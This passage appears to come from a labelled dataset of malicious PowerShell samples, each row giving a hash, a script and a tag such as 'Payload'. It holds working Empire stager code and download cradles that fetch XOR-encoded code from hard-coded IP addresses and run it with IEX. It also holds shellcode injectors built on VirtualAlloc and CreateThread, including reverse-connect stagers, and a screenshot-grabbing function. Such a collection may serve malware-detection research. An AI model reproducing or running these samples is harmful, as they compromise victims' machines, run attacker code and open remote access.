    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    $bytes=$e.GetBytes([System.Convert]::ToBase64String($rc4p2));
    $IE.navigate2($s+""/index.php"", 14, 0, $bytes, $customHeaders);
    while($ie.busy -eq $true){Start-Sleep -Milliseconds 100};
    $html = $IE.document.GetType().InvokeMember(""body"", [System.Reflection.BindingFlags]::GetProperty, $Null, $IE.document, $Null).InnerHtml;
    try {
        $raw = [System.Convert]::FromBase64String($html);
    }
    catch {$Null};

    
    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );

    
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    
    Invoke-Empire -Servers @(($s -split ""/"")[0..2] -join ""/"") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours ""WORKING_HOURS_REPLACE"" -KillDate ""REPLACE_KILLDATE"";
}

Start-Negotiate -s ""$ser"" -SK 'REPLACE_STAGING_KEY' -UA $u;
",TaskExecution
e141842847c17add96ce2745ef5b581d276c649bdc4311668b845e01e21a0be2,"
[SYstEM.NEt.SErViCEPOiNTMANAgER]::ExPecT100COntinUE = 0;$Wc=New-ObjeCt SysteM.NeT.WeBCLIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdeRs.ADd('User-Agent',$u);$Wc.PROxY = [SyStEm.NeT.WEBREQUeST]::DEFaUlTWEbPrOxY;$wC.PRoxY.CrEDeNtiAlS = [SysTem.NEt.CRedeNtiAlCAcHE]::DefAulTNETWORkCrEDEntIals;$K='8853bb10b83b5d276cfcf13a03100665';$i=0;[CHAR[]]$B=([Char[]]($Wc.DoWNloADStRinG(""http://192.168.0.111:8080/index.asp"")))|%{$_-bXor$k[$I++%$K.LeNgth]};IEX ($B-JOin'')

",Payload
816042bab517d5dc50300ee4750590c322a1d4bda891f3343b11f8c1fca7e7d3,"
$ae2A = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ae2A -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xc2,0x55,0xbe,0x5b,0xda,0xc2,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x75,0x13,0x03,0x75,0x13,0x83,0xc5,0xc6,0xb7,0x4b,0xa7,0x2e,0xb5,0xb4,0x58,0xae,0xda,0x3d,0xbd,0x9f,0xda,0x5a,0xb5,0x8f,0xea,0x29,0x9b,0x23,0x80,0x7c,0x08,0xb0,0xe4,0xa8,0x3f,0x71,0x42,0x8f,0x0e,0x82,0xff,0xf3,0x11,0x00,0x02,0x20,0xf2,0x39,0xcd,0x35,0xf3,0x7e,0x30,0xb7,0xa1,0xd7,0x3e,0x6a,0x56,0x5c,0x0a,0xb7,0xdd,0x2e,0x9a,0xbf,0x02,0xe6,0x9d,0xee,0x94,0x7d,0xc4,0x30,0x16,0x52,0x7c,0x79,0x00,0xb7,0xb9,0x33,0xbb,0x03,0x35,0xc2,0x6d,0x5a,0xb6,0x69,0x50,0x53,0x45,0x73,0x94,0x53,0xb6,0x06,0xec,0xa0,0x4b,0x11,0x2b,0xdb,0x97,0x94,0xa8,0x7b,0x53,0x0e,0x15,0x7a,0xb0,0xc9,0xde,0x70,0x7d,0x9d,0xb9,0x94,0x80,0x72,0xb2,0xa0,0x09,0x75,0x15,0x21,0x49,0x52,0xb1,0x6a,0x09,0xfb,0xe0,0xd6,0xfc,0x04,0xf2,0xb9,0xa1,0xa0,0x78,0x57,0xb5,0xd8,0x22,0x3f,0x7a,0xd1,0xdc,0xbf,0x14,0x62,0xae,0x8d,0xbb,0xd8,0x38,0xbd,0x34,0xc7,0xbf,0xc2,0x6e,0xbf,0x50,0x3d,0x91,0xc0,0x79,0xf9,0xc5,0x90,0x11,0x28,0x66,0x7b,0xe2,0xd5,0xb3,0x16,0xe7,0x41,0xfc,0x4f,0xe6,0x94,0x94,0x8d,0xe9,0x86,0x85,0x1b,0x0f,0xf6,0x15,0x4c,0x80,0xb6,0xc5,0x2c,0x70,0x5e,0x0c,0xa3,0xaf,0x7e,0x2f,0x69,0xd8,0x14,0xc0,0xc4,0xb0,0x80,0x79,0x4d,0x4a,0x31,0x85,0x5b,0x36,0x71,0x0d,0x68,0xc6,0x3f,0xe6,0x05,0xd4,0xd7,0x06,0x50,0x86,0x71,0x18,0x4e,0xad,0x7d,0x8c,0x75,0x64,0x2a,0x38,0x74,0x51,0x1c,0xe7,0x87,0xb4,0x17,0x2e,0x12,0x77,0x4f,0x4f,0xf2,0x77,0x8f,0x19,0x98,0x77,0xe7,0xfd,0xf8,0x2b,0x12,0x02,0xd5,0x5f,0x8f,0x97,0xd6,0x09,0x7c,0x3f,0xbf,0xb7,0x5b,0x77,0x60,0x47,0x8e,0x89,0x5c,0x9e,0xf6,0xff,0x8c,0x22;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$7Jd=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($7Jd.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$7Jd,0,0,0);for (;;){Start-sleep 60};

",Payload
ede7579b425affd420e3ca745a7679bf50a19b2b642a6c6d5955183c942291e7,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0x5b,0x11,0x00,0x00,0xe8,0xb3,0x00,0x00,0x00,0x2f,0x77,0x54,0x56,0x57,0x6e,0x6b,0x78,0x6f,0x56,0x6f,0x49,0x5a,0x54,0x78,0x68,0x4f,0x54,0x7a,0x44,0x4d,0x44,0x41,0x4c,0x70,0x79,0x58,0x41,0x42,0x6b,0x76,0x61,0x42,0x51,0x57,0x64,0x45,0x32,0x38,0x68,0x4c,0x7a,0x6b,0x51,0x6c,0x79,0x37,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x4f,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x6c,0x69,0x7a,0x61,0x6e,0x6f,0x76,0x61,0x2e,0x7a,0x61,0x70,0x74,0x6f,0x2e,0x6f,0x72,0x67,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
3cf050187ceec8f09e5e26caee9ba83a56bb740c05d862005c0e40f25ea6222f,"
$Xgfi = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Xgfi -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x21,0x2d,0x9c,0x3d,0xd9,0xf7,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x46,0x13,0x03,0x46,0x13,0x83,0xee,0xdd,0xcf,0x69,0xc1,0xf5,0x92,0x92,0x3a,0x05,0xf3,0x1b,0xdf,0x34,0x33,0x7f,0xab,0x66,0x83,0x0b,0xf9,0x8a,0x68,0x59,0xea,0x19,0x1c,0x76,0x1d,0xaa,0xab,0xa0,0x10,0x2b,0x87,0x91,0x33,0xaf,0xda,0xc5,0x93,0x8e,0x14,0x18,0xd5,0xd7,0x49,0xd1,0x87,0x80,0x06,0x44,0x38,0xa5,0x53,0x55,0xb3,0xf5,0x72,0xdd,0x20,0x4d,0x74,0xcc,0xf6,0xc6,0x2f,0xce,0xf9,0x0b,0x44,0x47,0xe2,0x48,0x61,0x11,0x99,0xba,0x1d,0xa0,0x4b,0xf3,0xde,0x0f,0xb2,0x3c,0x2d,0x51,0xf2,0xfa,0xce,0x24,0x0a,0xf9,0x73,0x3f,0xc9,0x80,0xaf,0xca,0xca,0x22,0x3b,0x6c,0x37,0xd3,0xe8,0xeb,0xbc,0xdf,0x45,0x7f,0x9a,0xc3,0x58,0xac,0x90,0xff,0xd1,0x53,0x77,0x76,0xa1,0x77,0x53,0xd3,0x71,0x19,0xc2,0xb9,0xd4,0x26,0x14,0x62,0x88,0x82,0x5e,0x8e,0xdd,0xbe,0x3c,0xc6,0x12,0xf3,0xbe,0x16,0x3d,0x84,0xcd,0x24,0xe2,0x3e,0x5a,0x04,0x6b,0x99,0x9d,0x6b,0x46,0x5d,0x31,0x92,0x69,0x9e,0x1b,0x50,0x3d,0xce,0x33,0x71,0x3e,0x85,0xc3,0x7e,0xeb,0x30,0xc1,0xe8,0x0c,0xf4,0xba,0xe4,0x44,0xf4,0x3c,0xf9,0x10,0x71,0xda,0x51,0x49,0xd2,0x73,0x11,0x39,0x92,0x23,0xf9,0x53,0x1d,0x1b,0x19,0x5c,0xf7,0x34,0xb3,0xb3,0xae,0x6d,0x2b,0x2d,0xeb,0xe6,0xca,0xb2,0x21,0x83,0xcc,0x39,0xc6,0x73,0x82,0xc9,0xa3,0x67,0x72,0x3a,0xfe,0xda,0xd4,0x45,0xd4,0x71,0xd8,0xd3,0xd3,0xd3,0x8f,0x4b,0xde,0x02,0xe7,0xd3,0x21,0x61,0x7c,0xdd,0xb7,0xca,0xea,0x22,0x58,0xcb,0xea,0x74,0x32,0xcb,0x82,0x20,0x66,0x98,0xb7,0x2e,0xb3,0x8c,0x64,0xbb,0x3c,0xe5,0xd9,0x6c,0x55,0x0b,0x04,0x5a,0xfa,0xf4,0x63,0x5a,0xc6,0x22,0x4d,0x28,0x26,0xf7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$8HP9=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($8HP9.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$8HP9,0,0,0);for (;;){Start-sleep 60};

",Payload
0d071db75e2ac22f6fdbf67ad032bb00a3be8c42b24113f97a16b26176efd5dd,"
$y7xF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $y7xF -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc7,0xbb,0x3d,0xc9,0x77,0x7e,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x58,0x18,0x03,0x58,0x18,0x83,0xc0,0x39,0x2b,0x82,0x82,0xa9,0x29,0x6d,0x7b,0x29,0x4e,0xe7,0x9e,0x18,0x4e,0x93,0xeb,0x0a,0x7e,0xd7,0xbe,0xa6,0xf5,0xb5,0x2a,0x3d,0x7b,0x12,0x5c,0xf6,0x36,0x44,0x53,0x07,0x6a,0xb4,0xf2,0x8b,0x71,0xe9,0xd4,0xb2,0xb9,0xfc,0x15,0xf3,0xa4,0x0d,0x47,0xac,0xa3,0xa0,0x78,0xd9,0xfe,0x78,0xf2,0x91,0xef,0xf8,0xe7,0x61,0x11,0x28,0xb6,0xfa,0x48,0xea,0x38,0x2f,0xe1,0xa3,0x22,0x2c,0xcc,0x7a,0xd8,0x86,0xba,0x7c,0x08,0xd7,0x43,0xd2,0x75,0xd8,0xb1,0x2a,0xb1,0xde,0x29,0x59,0xcb,0x1d,0xd7,0x5a,0x08,0x5c,0x03,0xee,0x8b,0xc6,0xc0,0x48,0x70,0xf7,0x05,0x0e,0xf3,0xfb,0xe2,0x44,0x5b,0x1f,0xf4,0x89,0xd7,0x1b,0x7d,0x2c,0x38,0xaa,0xc5,0x0b,0x9c,0xf7,0x9e,0x32,0x85,0x5d,0x70,0x4a,0xd5,0x3e,0x2d,0xee,0x9d,0xd2,0x3a,0x83,0xff,0xba,0x8f,0xae,0xff,0x3a,0x98,0xb9,0x8c,0x08,0x07,0x12,0x1b,0x20,0xc0,0xbc,0xdc,0x47,0xfb,0x79,0x72,0xb6,0x04,0x7a,0x5a,0x7c,0x50,0x2a,0xf4,0x55,0xd9,0xa1,0x04,0x5a,0x0c,0x5f,0x00,0xcc,0xff,0x51,0xdd,0x32,0x68,0x90,0xe2,0x4e,0x3f,0x1d,0x04,0x1e,0xef,0x4d,0x99,0xde,0x5f,0x2e,0x49,0xb6,0xb5,0xa1,0xb6,0xa6,0xb5,0x6b,0xdf,0x4c,0x5a,0xc2,0xb7,0xf8,0xc3,0x4f,0x43,0x99,0x0c,0x5a,0x29,0x99,0x87,0x69,0xcd,0x57,0x60,0x07,0xdd,0x0f,0x80,0x52,0xbf,0x99,0x9f,0x48,0xaa,0x25,0x0a,0x77,0x7d,0x72,0xa2,0x75,0x58,0xb4,0x6d,0x85,0x8f,0xcf,0xa4,0x13,0x70,0xa7,0xc8,0xf3,0x70,0x37,0x9f,0x99,0x70,0x5f,0x47,0xfa,0x22,0x7a,0x88,0xd7,0x56,0xd7,0x1d,0xd8,0x0e,0x84,0xb6,0xb0,0xac,0xf3,0xf1,0x1e,0x4e,0xd6,0x03,0x62,0x99,0x1e,0x76,0x8a,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$M3Cb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($M3Cb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$M3Cb,0,0,0);for (;;){Start-sleep 60};

",Payload
c5c3b59baad36c3eb9a7e00607f8e0093418a8e9f3fbcbb08f6f609deffab329,"
$8rd = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $8rd -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xd8,0xc2,0x53,0x8f,0xda,0xd3,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x68,0x13,0x03,0x68,0x13,0x83,0xc0,0xdc,0x20,0xa6,0x73,0x34,0x26,0x49,0x8c,0xc4,0x47,0xc3,0x69,0xf5,0x47,0xb7,0xfa,0xa5,0x77,0xb3,0xaf,0x49,0xf3,0x91,0x5b,0xda,0x71,0x3e,0x6b,0x6b,0x3f,0x18,0x42,0x6c,0x6c,0x58,0xc5,0xee,0x6f,0x8d,0x25,0xcf,0xbf,0xc0,0x24,0x08,0xdd,0x29,0x74,0xc1,0xa9,0x9c,0x69,0x66,0xe7,0x1c,0x01,0x34,0xe9,0x24,0xf6,0x8c,0x08,0x04,0xa9,0x87,0x52,0x86,0x4b,0x44,0xef,0x8f,0x53,0x89,0xca,0x46,0xef,0x79,0xa0,0x58,0x39,0xb0,0x49,0xf6,0x04,0x7d,0xb8,0x06,0x40,0xb9,0x23,0x7d,0xb8,0xba,0xde,0x86,0x7f,0xc1,0x04,0x02,0x64,0x61,0xce,0xb4,0x40,0x90,0x03,0x22,0x02,0x9e,0xe8,0x20,0x4c,0x82,0xef,0xe5,0xe6,0xbe,0x64,0x08,0x29,0x37,0x3e,0x2f,0xed,0x1c,0xe4,0x4e,0xb4,0xf8,0x4b,0x6e,0xa6,0xa3,0x34,0xca,0xac,0x49,0x20,0x67,0xef,0x05,0x85,0x4a,0x10,0xd5,0x81,0xdd,0x63,0xe7,0x0e,0x76,0xec,0x4b,0xc6,0x50,0xeb,0xac,0xfd,0x25,0x63,0x53,0xfe,0x55,0xad,0x97,0xaa,0x05,0xc5,0x3e,0xd3,0xcd,0x15,0xbf,0x06,0x7b,0x13,0x57,0xc7,0xf4,0x72,0xe1,0x7f,0x07,0x85,0xfc,0x23,0x8e,0x63,0xae,0x8b,0xc0,0x3b,0x0e,0x7c,0xa1,0xeb,0xe6,0x96,0x2e,0xd3,0x16,0x99,0xe4,0x7c,0xbc,0x76,0x51,0xd4,0x28,0xee,0xf8,0xae,0xc9,0xef,0xd6,0xca,0xc9,0x64,0xd5,0x2b,0x87,0x8c,0x90,0x3f,0x7f,0x7d,0xef,0x62,0x29,0x82,0xc5,0x09,0xd5,0x16,0xe2,0x9b,0x82,0x8e,0xe8,0xfa,0xe4,0x10,0x12,0x29,0x7f,0x98,0x86,0x92,0x17,0xe5,0x46,0x13,0xe7,0xb3,0x0c,0x13,0x8f,0x63,0x75,0x40,0xaa,0x6b,0xa0,0xf4,0x67,0xfe,0x4b,0xad,0xd4,0xa9,0x23,0x53,0x03,0x9d,0xeb,0xac,0x66,0x1f,0xd7,0x7a,0x4e,0x55,0x39,0xbf;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kYx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kYx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kYx,0,0,0);for (;;){Start-sleep 60};

",Payload
5cb32d37fe8b8184ef0c4bd6f245191628b2ff4daec49babf7073e1e3efcc7e4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x02,0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
da3b60c294add096cf4a142f3d3d5710754444672cfe4b3dced9c216bd13fcdc,"function Get-Screenshot 
{
    param
    (
        [Parameter(Mandatory = $False)]
        [string]
        $Ratio
    )
    Add-Type -Assembly System.Windows.Forms;
    $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen;
    $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height;
    $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject);
    $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size);
    $DrawingGraphics.Dispose();
    $ms = New-Object System.IO.MemoryStream;
    if ($Ratio) {
    	try {
    		$iQual = [convert]::ToInt32($Ratio);
    	} catch {
    		$iQual=80;
    	}
    	if ($iQual -gt 100){
    		$iQual=100;
    	} elseif ($iQual -lt 1){
    		$iQual=1;
    	}
    	$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters;
			$encoderParams.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, $iQual);
			$jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatDescription -eq ""JPEG"" }
			$ScreenshotObject.save($ms, $jpegCodec, $encoderParams);
		} else {
    	$ScreenshotObject.save($ms, [Drawing.Imaging.ImageFormat]::Png);
    }
    $ScreenshotObject.Dispose();
    [convert]::ToBase64String($ms.ToArray());
}
Get-Screenshot",Payload
73b384e76fd99f579ef3617ea67e2d312499888a4f03bd068f0ab946337b0920,"
$WC=NEW-OBjECT SySteM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEaDeRs.Add('User-Agent',$u);$Wc.ProxY = [SYstem.Net.WEbREqUESt]::DefaUlTWeBPrOXy;$wc.PRoxy.CRedeNtiAls = [SySteM.NET.CReDEntiALCaChe]::DEFaULTNETwoRkCREDEnTiaLS;$K='0qoga`PzyB\\pse]{_iO.G*Dd>uN=x?:S';$i=0;[CHAr[]]$B=([ChAR[]]($wc.DownloaDStrInG(""https://46.101.90.248:443/index.asp"")))|%{$_-BXOr$k[$I++%$K.LengTh]};IEX ($b-joiN'')

",Payload
98de8f195d0011909de9a603252bd1bd8b058788a2d6a90c151d6f5cdd42b094,"
$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $qkc -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,